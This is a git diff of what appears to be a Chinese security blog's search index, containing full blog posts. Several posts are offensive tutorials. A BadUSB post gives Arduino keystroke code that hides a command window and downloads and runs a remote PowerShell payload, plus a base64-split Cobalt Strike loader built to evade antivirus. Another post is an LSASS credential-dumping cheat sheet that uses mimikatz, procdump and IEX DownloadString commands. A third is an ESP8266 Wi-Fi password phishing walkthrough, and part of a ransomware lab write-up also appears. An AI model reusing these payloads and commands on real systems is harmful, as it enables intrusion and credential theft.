@@ -1,82 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BadUSB配合CS免杀实现上线</title>
-    <url>/2021/09/14/BadUSB%E9%85%8D%E5%90%88CS%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0%E4%B8%8A%E7%BA%BF/</url>
-    <content><![CDATA[BadUSB介绍随着互联网技术的发展，USB 能够连接到许多不同的设备，包括鼠标、键盘、相机、摄像头、无线网络设备等。但不幸的是，USB 的设计方式产生了这个 BadUSB 安全漏洞。
-BadUSB 漏洞是由安全研究人员 Karsten Nohl 和 Jakob Lell 在 2014 年黑帽会议上首次发现并暴露出来的，这也就让USB安全和几乎所有和USB相关的设备（包括具有USB端口的电脑）都陷入相当危险的状态。
-就狭义来说，BadUSB是指形似 U 盘的设备，内部的电路在上电之后会被系统识别为键盘，此时该设备内部的芯片开始与电脑进行键盘通讯，仿照人的输入习惯，来操作电脑，以此达到骇入电脑的目的。
-就广义来说，BadUSB是指一切会被电脑识别为  HID 设备的，外观却不像键盘的电子设备。现阶段有的 badusb 是形似数据线的，有的则是手机加定制内核，以发挥 BadUSB  的作用，更有甚者，将 BadUSB 开发为模块，可以嵌入任意的带 USB 接口的设备中。
-准备工作购买 badusb（序） 、 烧录器 、 云服务器（推荐vultr）；共计开销大概二百五?
-①.在服务器中上传cs、screen，用于制作cs免杀马等
-sftp root@IPlsput \xxx\cs.zip ssh root@IPapt updateapt install unzipunzip cs.zipapt install default-jdkcd cschmod 777 teamserversudo ./teamserver IP passwordapt install screenscreen -S test
-
-②.下载并安装开发环境Arduino
-由于 Arduino 的易用性，现阶段最常用的 BadUSB 还是基于 Arduino 进行设计的 下载地址：https://www.arduino.cc/en/software （有Windows、Linux、Mac版本，PS：建议别下最新的）
-③.通过 zading 软件在电脑上安装对应的烧录器驱动
-首先需要让电脑识别到我们的BadUSB设备（PS：需要找老的type-a线，新的我试过去貌似都无法识别）
-
-然后打开 zading 软件，点击 Options - List All Devices，找到我们的 usbasp 按照下图设置好驱动
-
-当其在设备管理器中显示为 libusb-win32 devices 设备时，就意味着安装好了烧录器驱动
-
-④.下载并安装烧录工具 progisp
-网盘链接（提取码：xrb9）
-CS免杀操作制作CS免杀?
-
-将其base64编码处理一下
-Set-StrictMode -Version 2 $a1 = &#x27;base64编码&#x27;$a2 = &#x27;base64编码&#x27;$a3 = &#x27;base64编码&#x27;$a4 = &#x27;base64编码&#x27;$a5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1+$a2+$a3+$a4)) If ([IntPtr]::size -eq 8) &#123;    start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $a5 | wait-job | Receive-Job&#125;else &#123;    IEX $a5&#125;
-
-将其文件名重命名为全大写的，然后通过CS上传至我们的公网服务器上（攻击 - 钓鱼攻击 - 文件下载），实现全程无落地✈
-
-然后将我们需要的操作搞成思路，形成最基础的想法，接着将思路写成代码，通过 Arduino 编译生产hex文件，最后利用工具 progisp 烧录到我们的BadUSB中
-
-附上部分关键代码
-//payloadif (onetimeOrForever == 0)&#123;  delay(1000);  Keyboard.begin();//开始键盘通讯   delay(1500);//延时   Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);  Keyboard.press(&#x27;r&#x27;);//r键  delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  delay(500);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.println(&quot;CMD /t:01 /k @ECHO OFF &amp;&amp; MODE CON:cols=15 lines=1&quot;);   //使用最小化隐藏cmd窗口  //cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN  delay(500);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);   delay(1300);  Keyboard.println(&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://IP/payload.ps1&#x27;) | powershell -&quot;);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);   Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯    delay(1000);  Keyboard.begin();//开始键盘通讯   delay(1500);//延时   Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);  Keyboard.press(&#x27;r&#x27;);//r键  delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  delay(500);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.println(&quot;notepad.exe&quot;);    //打开记事本  delay(500);  Keyboard.println(&quot;                                   $$$$ &quot;);  delay(500);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                        $$$$$$         $$$$$$&quot;);  Keyboard.println(&quot;   $$$$$$     $$         $$         $$        $$$$&quot;);  Keyboard.println(&quot;   $$         $$$$         $$         $$        $$    $$&quot;);  Keyboard.println(&quot;   $$             $$         $$         $$        $$        $$&quot;);  Keyboard.println(&quot;        $$        $$                                 $$         $$&quot;);  Keyboard.println(&quot;          $$$    $$                                              $$&quot;);  Keyboard.println(&quot;            $$                                                      $$&quot;);  Keyboard.println(&quot;              $$$                                                  $$&quot;);  Keyboard.println(&quot;                $$                                                  $$&quot;);  Keyboard.println(&quot;                  $$$                                              $$&quot;);  Keyboard.println(&quot;                    $$                                          $$$&quot;);  Keyboard.println(&quot;                      $$$                                      $$&quot;);  Keyboard.println(&quot;                        $$                                      $$&quot;);  Keyboard.println(&quot;                          $$$                              $$$&quot;);  Keyboard.println(&quot;                            $$                              $$&quot;);  Keyboard.println(&quot;                            $$$$$$$$$$$$$$$$$$$$&quot;);  delay(500);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯
-
-至此，我们的BadUSB配合CS免杀上线就已完工✌
-防范措施不要随意使用未知来源的USB设备
-总结未知攻，焉知防。我展示如何攻击的目的是为了让大家知道这个漏洞，了解并认识到网络安全的重要性，更好的进行防御，而不是以此为武器去伤害别人！
-注：此文章仅限于安全研究，违法犯罪与作者无关！
-
-    
-]]></content>
-      <categories>
-        <category>研究随笔</category>
-      </categories>
-      <tags>
-        <tag>BadUSB</tag>
-        <tag>免杀</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DDNS GO实现动态解析</title>
-    <url>/2023/03/04/NAS-DDNSGO/</url>
-    <content><![CDATA[首先到套件中心安装ddns-go
-
-接着打开ddns-go后填写ID、token和Domains的信息即可，腾讯云的话可以直接点击创建密钥来生成ID和token
-
-具体可参考文章：https://cloud.tencent.com/developer/article/1921363
-
-
-
-然后回到nas的控制面板里直接去搜索一下证书找到位置进行新增证书
-
-
-
-然后去之前申请证书的dnspod中下载证书文件，这里选择nginx
-
-将下载的证书文件导入即可
-
-]]></content>
-      <categories>
-        <category>折腾实录</category>
-      </categories>
-      <tags>
-        <tag>NAS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>帆软报表前台远程代码执行漏洞</title>
     <url>/2026/01/19/FineReport%20RCE202512/</url>
     <content><![CDATA[
@@ -150,6 +74,82 @@ site:example.com filetype:xlssite:example.com filetype:sqlsite:example.com filet
       </categories>
       <tags>
         <tag>GoogleHacking</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BadUSB配合CS免杀实现上线</title>
+    <url>/2021/09/14/BadUSB%E9%85%8D%E5%90%88CS%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0%E4%B8%8A%E7%BA%BF/</url>
+    <content><![CDATA[BadUSB介绍随着互联网技术的发展，USB 能够连接到许多不同的设备，包括鼠标、键盘、相机、摄像头、无线网络设备等。但不幸的是，USB 的设计方式产生了这个 BadUSB 安全漏洞。
+BadUSB 漏洞是由安全研究人员 Karsten Nohl 和 Jakob Lell 在 2014 年黑帽会议上首次发现并暴露出来的，这也就让USB安全和几乎所有和USB相关的设备（包括具有USB端口的电脑）都陷入相当危险的状态。
+就狭义来说，BadUSB是指形似 U 盘的设备，内部的电路在上电之后会被系统识别为键盘，此时该设备内部的芯片开始与电脑进行键盘通讯，仿照人的输入习惯，来操作电脑，以此达到骇入电脑的目的。
+就广义来说，BadUSB是指一切会被电脑识别为  HID 设备的，外观却不像键盘的电子设备。现阶段有的 badusb 是形似数据线的，有的则是手机加定制内核，以发挥 BadUSB  的作用，更有甚者，将 BadUSB 开发为模块，可以嵌入任意的带 USB 接口的设备中。
+准备工作购买 badusb（序） 、 烧录器 、 云服务器（推荐vultr）；共计开销大概二百五?
+①.在服务器中上传cs、screen，用于制作cs免杀马等
+sftp root@IPlsput \xxx\cs.zip ssh root@IPapt updateapt install unzipunzip cs.zipapt install default-jdkcd cschmod 777 teamserversudo ./teamserver IP passwordapt install screenscreen -S test
+
+②.下载并安装开发环境Arduino
+由于 Arduino 的易用性，现阶段最常用的 BadUSB 还是基于 Arduino 进行设计的 下载地址：https://www.arduino.cc/en/software （有Windows、Linux、Mac版本，PS：建议别下最新的）
+③.通过 zading 软件在电脑上安装对应的烧录器驱动
+首先需要让电脑识别到我们的BadUSB设备（PS：需要找老的type-a线，新的我试过去貌似都无法识别）
+
+然后打开 zading 软件，点击 Options - List All Devices，找到我们的 usbasp 按照下图设置好驱动
+
+当其在设备管理器中显示为 libusb-win32 devices 设备时，就意味着安装好了烧录器驱动
+
+④.下载并安装烧录工具 progisp
+网盘链接（提取码：xrb9）
+CS免杀操作制作CS免杀?
+
+将其base64编码处理一下
+Set-StrictMode -Version 2 $a1 = &#x27;base64编码&#x27;$a2 = &#x27;base64编码&#x27;$a3 = &#x27;base64编码&#x27;$a4 = &#x27;base64编码&#x27;$a5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1+$a2+$a3+$a4)) If ([IntPtr]::size -eq 8) &#123;    start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $a5 | wait-job | Receive-Job&#125;else &#123;    IEX $a5&#125;
+
+将其文件名重命名为全大写的，然后通过CS上传至我们的公网服务器上（攻击 - 钓鱼攻击 - 文件下载），实现全程无落地✈
+
+然后将我们需要的操作搞成思路，形成最基础的想法，接着将思路写成代码，通过 Arduino 编译生产hex文件，最后利用工具 progisp 烧录到我们的BadUSB中
+
+附上部分关键代码
+//payloadif (onetimeOrForever == 0)&#123;  delay(1000);  Keyboard.begin();//开始键盘通讯   delay(1500);//延时   Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);  Keyboard.press(&#x27;r&#x27;);//r键  delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  delay(500);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.println(&quot;CMD /t:01 /k @ECHO OFF &amp;&amp; MODE CON:cols=15 lines=1&quot;);   //使用最小化隐藏cmd窗口  //cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN  delay(500);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);   delay(1300);  Keyboard.println(&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://IP/payload.ps1&#x27;) | powershell -&quot;);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);   Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯    delay(1000);  Keyboard.begin();//开始键盘通讯   delay(1500);//延时   Keyboard.press(KEY_LEFT_GUI);//win键   delay(500);  Keyboard.press(&#x27;r&#x27;);//r键  delay(500);   Keyboard.release(KEY_LEFT_GUI);  Keyboard.release(&#x27;r&#x27;);  delay(500);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.println(&quot;notepad.exe&quot;);    //打开记事本  delay(500);  Keyboard.println(&quot;                                   $$$$ &quot;);  delay(500);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                               $$         $$&quot;);  Keyboard.println(&quot;                        $$$$$$         $$$$$$&quot;);  Keyboard.println(&quot;   $$$$$$     $$         $$         $$        $$$$&quot;);  Keyboard.println(&quot;   $$         $$$$         $$         $$        $$    $$&quot;);  Keyboard.println(&quot;   $$             $$         $$         $$        $$        $$&quot;);  Keyboard.println(&quot;        $$        $$                                 $$         $$&quot;);  Keyboard.println(&quot;          $$$    $$                                              $$&quot;);  Keyboard.println(&quot;            $$                                                      $$&quot;);  Keyboard.println(&quot;              $$$                                                  $$&quot;);  Keyboard.println(&quot;                $$                                                  $$&quot;);  Keyboard.println(&quot;                  $$$                                              $$&quot;);  Keyboard.println(&quot;                    $$                                          $$$&quot;);  Keyboard.println(&quot;                      $$$                                      $$&quot;);  Keyboard.println(&quot;                        $$                                      $$&quot;);  Keyboard.println(&quot;                          $$$                              $$$&quot;);  Keyboard.println(&quot;                            $$                              $$&quot;);  Keyboard.println(&quot;                            $$$$$$$$$$$$$$$$$$$$&quot;);  delay(500);  Keyboard.press(KEY_RETURN);   Keyboard.release(KEY_RETURN);  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法  Keyboard.release(KEY_CAPS_LOCK);  Keyboard.end();//结束键盘通讯
+
+至此，我们的BadUSB配合CS免杀上线就已完工✌
+防范措施不要随意使用未知来源的USB设备
+总结未知攻，焉知防。我展示如何攻击的目的是为了让大家知道这个漏洞，了解并认识到网络安全的重要性，更好的进行防御，而不是以此为武器去伤害别人！
+注：此文章仅限于安全研究，违法犯罪与作者无关！
+
+    
+]]></content>
+      <categories>
+        <category>研究随笔</category>
+      </categories>
+      <tags>
+        <tag>BadUSB</tag>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DDNS GO实现动态解析</title>
+    <url>/2023/03/04/NAS-DDNSGO/</url>
+    <content><![CDATA[首先到套件中心安装ddns-go
+
+接着打开ddns-go后填写ID、token和Domains的信息即可，腾讯云的话可以直接点击创建密钥来生成ID和token
+
+具体可参考文章：https://cloud.tencent.com/developer/article/1921363
+
+
+
+然后回到nas的控制面板里直接去搜索一下证书找到位置进行新增证书
+
+
+
+然后去之前申请证书的dnspod中下载证书文件，这里选择nginx
+
+将下载的证书文件导入即可
+
+]]></content>
+      <categories>
+        <category>折腾实录</category>
+      </categories>
+      <tags>
+        <tag>NAS</tag>
       </tags>
   </entry>
   <entry>
@@ -284,120 +284,6 @@ declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec s
       </tags>
   </entry>
   <entry>
-    <title>esp8266钓鱼获取指定WiFi密码</title>
-    <url>/2022/08/10/esp8266towifi/</url>
-    <content><![CDATA[前言前段时间收拾东西在以前瞎捣鼓的智能灯上把esp8266拆了下来，想着拿来研究无线电这块的知识，然后发现了一篇 用ESP8266无线模块进行钓鱼渗透测试 的文章，接下来就来复现一下吧
-
-准备工作硬件方面：esp8266 无线模块（我的和作者一样是块esp01）、USB 转 TTL 烧录器
-软件方面：ESP8266Flasher - nodemcu、XCOM串口调试助手、作者更新的固件
-链接：https://pan.baidu.com/s/1NiO9Ty_zDIvia-IgOtqrxw提取码：qkck
-
-烧录将我们的esp8266-01与烧录器连接然后插入电脑上，接着打开设备管理器找到 cp210x 这个端口
-
-接着我们打开nodemcu，在operation模块下选择com6端口
-
-然后在config模块下，输入固件路径，烧录地址 0x00000
-
-最后回到operation模块，点击 flash 开始烧录，当出现绿勾则说明烧录成功，如果烧录失败请擦除 flash 后重试（本人暂无出现失败情况
-
-测试
-wifi名称FishAP，密码：gkdamm666 后台：http://192.168.0.1/backdoor.html
-
-首先我们需要连接FishAP这个WiFi，然后访问后台，等待一会让模块扫描出附近的WiFi（PS：如果找不到FishAP这个WiFi，就重启模块
-
-接着勾选通用型，填写编号（编号就是列表最前面的那个数字，需要找到你所指定WiFi对应的编号
-
-没显示加密的那个就是我们的钓鱼WiFi
-
-灯亮表示在钓鱼，钓到密码以后灯灭，WiFi列表重新出现fishap，连接上打开后台即可看到密码
-
-总结建议别用esp8266-01进行钓鱼，它更适用于做WiFi杀手。其一是因为其性能低，加载钓鱼界面很久。其二，它的信号范围极小，别人很难扫描到。最好还是用加大功率的无线网卡配合fluxion等开源钓鱼项目
-]]></content>
-      <categories>
-        <category>研究随笔</category>
-      </categories>
-      <tags>
-        <tag>esp8266</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>导出Lsass.exe的一些手法</title>
-    <url>/2021/02/17/%E5%AF%BC%E5%87%BALsass.exe%E7%9A%84%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/</url>
-    <content><![CDATA[前言：红队中各种抓取密码凭据的方法，文末彩蛋，内附工具链接，以及我制作的过360的minikatz的版本，各位请享用，最近筹备重新开blog，记录学习计划，不然我学完立马就忘了，与大家一起学习。
-1. Procdump 转储Lsass.exe 的内存:前提：需要管理员及以上权限
-常用命令：
-procdump  -accepteula -ma lsass.exe lsass_dump
-
-导出的.dmp文件本地配合minikatz 取出密码
-sekurlsa::Minidump lsassdump.dmpsekurlsa::logonPasswords
-
-如果对lsass.exe敏感的话，那么还可以配合lsass.exe的pid来使用更香：
-procdump -accepteula -ma pid lsass.dmp
-
-2. wce导出hash：前提：需要管理员及以上权限，版本限制（仅支持Windows XP，2003，Vista7、2008和Windows 8）
-命令：
-wce.exe -o file.txtwec.exe
-
-3. comsvcs.dll转储LSASS.exe内存前提：在powershell中运行，管理员权限以上
-命令：
-C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
-
-清理：
-Remove-Item $env:TEMP\lsass.dmp -ErrorAction Ignore
-
-4.使用系统调用和拜托hook的api转储LSASS.exe内存详情请查看这篇文章：
-https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
-这是一篇非常nice的文章，值得一看，打开一个新世界的大门！
-有关github项目：
-https://github.com/outflanknl/Dumpert
-命令：
-dumpert_exe或者rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
-
-运行效果截图：
-
-5.Windows Task Manager转储LSASS.exe内存直接打开任务管理器，找到lsass.exe进程，右键选中右键
-
-6.Mimikatz前提：管理员权限以及以上，建议自己编译源码去掉一些特征字符，一些不必要的语句
-命令：
-mimikatz_exe &quot;sekurlsa::minidump lsass.dump&quot; &quot;sekurlsa::logonpasswords full&quot; exit
-
-powershell：
-#读取明文密码powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz –DumpCerts#读取hashpowershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes
-
-猕猴桃杀软重点看照对象之一。
-7.pypykatz读取LSASS前提：必须安装python3，管理员权限以及以上
-命令：
-#安装pip install pypykatz#使用pypykatz live lsa
-
-抓得不只是lsass，还有其他的。
-运行效果：
-
-杀软拦截概率很低
-8. Out-Minidump.ps1 转储 LSASS.exe内存前提：powershell，管理员权限以及以上
-命令：
-powershell “IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#x27;); get-process lsass | Out-Minidump”
-
-清除文件：
-Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
-
-
-杀软会拦截。
-彩蛋福利请看过360的minikatz截图：
-
-
-不知道是不是我刚更新没有关网络，把我64位的搞死了，但是32位的依然坚挺！然后接着保险起见，加壳
-工具包里面有我编译好的一些工具，懂得都懂嗷，不会的百度。
-
-公众号关注回复，minikatz，即可获得百度云下载链接，重伸一遍，本公众号分享的工具，技术只供学习研究，切勿拿去违法犯罪，违法犯罪与公众号与作者无关。
-]]></content>
-      <categories>
-        <category>红队笔记</category>
-      </categories>
-      <tags>
-        <tag>凭证获取</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>tomcat实现国密ssl</title>
     <url>/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/</url>
     <content><![CDATA[
@@ -443,117 +329,40 @@ set JAVA_HOME=C:\Program Files\Java\jdk1.8.0_321set JRE_HOME=C:\Program Files\Ja
       </tags>
   </entry>
   <entry>
-    <title>vulntarget-n</title>
-    <url>/2024/11/16/vulntarget-n/</url>
-    <content><![CDATA[前言在面对勒索病毒这样的网络威胁时，我们不能被动等待，而要积极应对。我们需要了解攻击的原理和过程，熟练掌握应急响应和取证分析的技术，以便在面对真实的威胁时能够迅速有效地应对。
-vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：
+    <title>esp8266钓鱼获取指定WiFi密码</title>
+    <url>/2022/08/10/esp8266towifi/</url>
+    <content><![CDATA[前言前段时间收拾东西在以前瞎捣鼓的智能灯上把esp8266拆了下来，想着拿来研究无线电这块的知识，然后发现了一篇 用ESP8266无线模块进行钓鱼渗透测试 的文章，接下来就来复现一下吧
 
-客户在阿里云部署的业务环境
-今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据
-客户发现其中部分重要文件被加密为.vulntarget结尾
+准备工作硬件方面：esp8266 无线模块（我的和作者一样是块esp01）、USB 转 TTL 烧录器
+软件方面：ESP8266Flasher - nodemcu、XCOM串口调试助手、作者更新的固件
+链接：https://pan.baidu.com/s/1NiO9Ty_zDIvia-IgOtqrxw提取码：qkck
 
+烧录将我们的esp8266-01与烧录器连接然后插入电脑上，接着打开设备管理器找到 cp210x 这个端口
 
-随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。
-具体要求如下：
+接着我们打开nodemcu，在operation模块下选择com6端口
 
-分析攻击事件是如何发生的，请给出攻击画像
-解密勒索
-恢复原来的index.jsp页面，恢复正常的web服务
-找到隐藏在其中的3个flag
+然后在config模块下，输入固件路径，烧录地址 0x00000
 
-已知服务器系统为Ubuntu20.04，账号密码： 账号：root 密码：Vulntarget@123
-ps：在本次靶场设计中少了一次反弹shell的操作，主要是防止设计者的ip出现泄露，在攻击路径描述中可以直接把反弹shell的步骤加上即可。
-准备工作解压完是个raw文件，VMware无法直接打开
+最后回到operation模块，点击 flash 开始烧录，当出现绿勾则说明烧录成功，如果烧录失败请擦除 flash 后重试（本人暂无出现失败情况
 
-可利用qemu工具转换为vmdk格式
-工具下载地址：https://qemu.weilnetz.de/w64/转换命令：qemu-img.exe convert -f raw -O vmdk vuln_m-j6cegcrhehdcba0r5h4v_system.raw vulntarget-n.vmdk
+测试
+wifi名称FishAP，密码：gkdamm666 后台：http://192.168.0.1/backdoor.html
 
+首先我们需要连接FishAP这个WiFi，然后访问后台，等待一会让模块扫描出附近的WiFi（PS：如果找不到FishAP这个WiFi，就重启模块
 
-然后新建虚拟机，稍后安装操作系统，选择磁盘为使用现有虚拟磁盘，保持现有格式即可
+接着勾选通用型，填写编号（编号就是列表最前面的那个数字，需要找到你所指定WiFi对应的编号
 
+没显示加密的那个就是我们的钓鱼WiFi
 
-应急响应首先查询特权用户特权用户等情况，未发现异常账号
+灯亮表示在钓鱼，钓到密码以后灯灭，WiFi列表重新出现fishap，连接上打开后台即可看到密码
 
-然后检查是否存在异常端口、进程、开机启动项等，但也未发现异常
-
-接着，再来查看历史命令发现flag：flag{vulntarget_very_G00d}
-root@iZj6c6hytildlalnu0cwt4Z:~# cat .bash_history    1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y    2  vim /etc/profile    3  source /etc/profile    4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip    5  unzip apache-tomcat-7.0.79.zip    6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat    7  mv apache-tomcat-7.0.79 /opt/tomcat    8  chmod +x /opt/tomcat/bin/*.sh    9  ls   10  history    11  flag&#123;vulntarget_very_G00d&#125;   12  /opt/tomcat/bin/startup.sh   13  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak   14  vim /opt/tomcat/conf/server.xml   15  ps -axu | grep tomcat   16  kill -9 6961   17  /opt/tomcat/bin/startup.sh   18  cp web.xml web.xml.bak   19  pwd    20  cd ..   21  ls   22  cd /opt/   23  ls   24  cd tomcat/   25  ls   26  cd conf/   27  cp web.xml web.xml.bak   28  vim web.xml   29  ps -axu | grep tomcat   30  kill -9 7409   31  /opt/tomcat/bin/startup.sh   32  pwd    33  cd ..   34  ls   35  cd webapps/   36  ls   37  cd ROOT/   38  ls   39  rm favicon.ico    40  cp index.jsp index.jsp.bak   41  ls   42  vim index.jsp   43  rm index.jsp   44  vim index.jsp   45  crontab -e   46  history    47  ls   48  mv vulntargetn.jsp 404.jsp   49  ls   50  rm index.jsp.bak   51  pip3 install rsa   52  ls   53  ls -lha   54  mkdir .vulntarget   55  cd .vulntarget/   56  ls   57  mkdir keys   58  ls   59  history    60  ls   61  vim get_pem.py   62  python3 get_pem.py    63  ls   64  rm get_pem.py    65  ls   66  cd ..   67  ls   68  cp .vulntarget/keys/pubkey.pem .   69  ls   70  ls | grep jsp   71  vim encrypt_vulntarget.py   72  ls   73  vim flag.jsp   74  ls | grep jsp   75  python3 encrypt_vulntarget.py    76  ls   77  cd .vulntarget/   78  ls   79  cd keys/   80  ls   81  cat pubkey.pem    82  cat privkey.pem    83  cd ..   84  ls   85  cd ..   86  ls   87  rm encrypt_vulntarget.py    88  rm pubkey.pem    89  ls   90  vim index.jsp   91  ls   92  cd ..   93  ls   94  cd ..   95  ls   96  cd logs/   97  ls   98  cat localhost_access_log.2024-06-04.txt    99  vim localhost_access_log.2024-06-04.txt   100  ls  101  vim localhost_access_log.2024-06-04.txt   102  ls  103  history   104  curl http://127.0.0.1  105  ls  106  cd   107  ls  108  ls -lha  109  cat .bashrc   110  ls  111  history &gt; .bash_historyapt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -yvim /etc/profilesource /etc/profilewget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zipunzip apache-tomcat-7.0.79.zipmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatchmod +x /opt/tomcat/bin/*.shlshistory flag&#123;vulntarget_very_G00d&#125;/opt/tomcat/bin/startup.shcp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bakvim /opt/tomcat/conf/server.xmlps -axu | grep tomcatkill -9 6961/opt/tomcat/bin/startup.shcp web.xml web.xml.bakpwd cd ..lscd /opt/lscd tomcat/lscd conf/cp web.xml web.xml.bakvim web.xmlps -axu | grep tomcatkill -9 7409/opt/tomcat/bin/startup.shpwd cd ..lscd webapps/lscd ROOT/lsrm favicon.ico cp index.jsp index.jsp.baklsvim index.jsprm index.jspvim index.jspcrontab -ehistory lsmv vulntargetn.jsp 404.jsplsrm index.jsp.bakpip3 install rsalsls -lhamkdir .vulntargetcd .vulntarget/lsmkdir keyslshistory lsvim get_pem.pypython3 get_pem.py lsrm get_pem.py lscd ..lscp .vulntarget/keys/pubkey.pem .lsls | grep jspvim encrypt_vulntarget.pylsvim flag.jspls | grep jsppython3 encrypt_vulntarget.py lscd .vulntarget/lscd keys/lscat pubkey.pem cat privkey.pem cd ..lscd ..lsrm encrypt_vulntarget.py rm pubkey.pem lsvim index.jsplscd ..lscd ..lscd logs/lscat localhost_access_log.2024-06-04.txt vim localhost_access_log.2024-06-04.txt lsvim localhost_access_log.2024-06-04.txt lshistory curl http://127.0.0.1lscd lsls -lhacat .bashrc lshistory &gt; .bash_historyhistory exit
-
-
-分析这些敏感历史命令发现攻击者可能将webshell写入到tomcat目录下，同时还发现了攻击者创建隐藏目录.vulntarget，并且编写运行get_pem.py和encrypt_vulntarget.py这两个rsa加密脚本来生成加密密钥对并加密
-根据历史命令来查看tomcat日志localhost_access_log.2024-06-04.txt，可知是tomcat PUT文件上传
-
-并且得到flag：flag{Welcome_t0_join_Us}
-
-进入tomcat的web目录下发现一共加密了4个文件
